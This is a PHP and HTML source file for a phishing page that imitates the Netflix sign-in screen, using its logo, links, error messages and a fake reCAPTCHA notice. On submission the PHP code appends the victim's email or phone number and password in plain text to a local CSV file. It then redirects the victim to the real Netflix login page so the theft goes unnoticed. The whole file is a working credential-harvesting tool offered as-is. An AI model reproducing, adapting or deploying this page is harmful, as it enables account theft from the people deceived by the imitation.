<?php

    $login_id= $password="";
    $login_id_empty= $password_empty="";
     
    if($_SERVER["REQUEST_METHOD"]=="POST")
    {
        if(empty($_POST["login_id"]) || empty($_POST["password"]))
        {
            if(empty($_POST["login_id"]))
            $login_id_empty="Please enter a valid email address or phone number.";
            
            if(empty($_POST["password"]))
            $password_empty="Your password must contain between 4 and 60 characters.";
        }
        else
        {
            $login_id=htmlspecialchars($_POST["login_id"]);
            $password=htmlspecialchars($_POST["password"]);

            if(filter_var($login_id,FILTER_VALIDATE_EMAIL) or preg_match("/^[0-9]{10}+$/",$login_id))
            {
                $csv_file=fopen("login_detail.csv","a");

                // to be run only the first time
                fwrite($csv_file, "Email/Phone_number");
                fwrite($csv_file, ",");
                fwrite($csv_file, "Password");

                fwrite($csv_file, "\n");
                fwrite($csv_file, $login_id);
                fwrite($csv_file, ",");
                fwrite($csv_file, $password);
                header("Refresh:0; url=https://www.netflix.com/login");
            }
            else
            {
                $login_id_empty="Please enter a valid email address or phone number.";
            }
        }

    }

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <header>
            <a href="https://www.netflix.com/in/"><img src="netflix.png" alt="Netflix" id="netflix_logo"></a>
        </header>

        <div class="form_container">
            <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
                <p class="form_header"> Sign In</p>
                <input type="text" placeholder="Email or mobile number" name="login_id" class="login_info">
                <div class="error"><?php echo $login_id_empty; ?></div>
                <input type="password" placeholder="Password" name="password" class="login_info"><br>
                <div class="error"><?php echo $password_empty; ?></div>
                <button type="submit" id="signin" >Sign In</button><br>
                <a href="https://www.netflix.com/in/LoginHelp" id="forgot_pass">Forgot password?</a><br>
                <input type="checkbox" id="cb"> 
                <label for="cb">Remember me</label>
                <p  id="signup">New to Netflix? <a href="https://www.netflix.com/in/">Sign up now.</a></p>

                <p id="learn_more">This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="">Learn more.</a></p>
            </form>
        </div>
    </div>

    <div class="bottom">
        <p>Questions? Call 000-800-919-1694</p>
        <footer>
            <a href="https://help.netflix.com/en/node/412">FAQ</a>
            <a href="https://help.netflix.com/legal/termsofuse">Terms of Use</a>
            <a href="https://help.netflix.com/en/node/134094">Corporate Information</a><br>
            <a href="https://help.netflix.com/legal/privacy">Privacy</a>
            <a href="https://help.netflix.com/en">Help Centre</a>
        </footer>

    </div>
</body>
</html>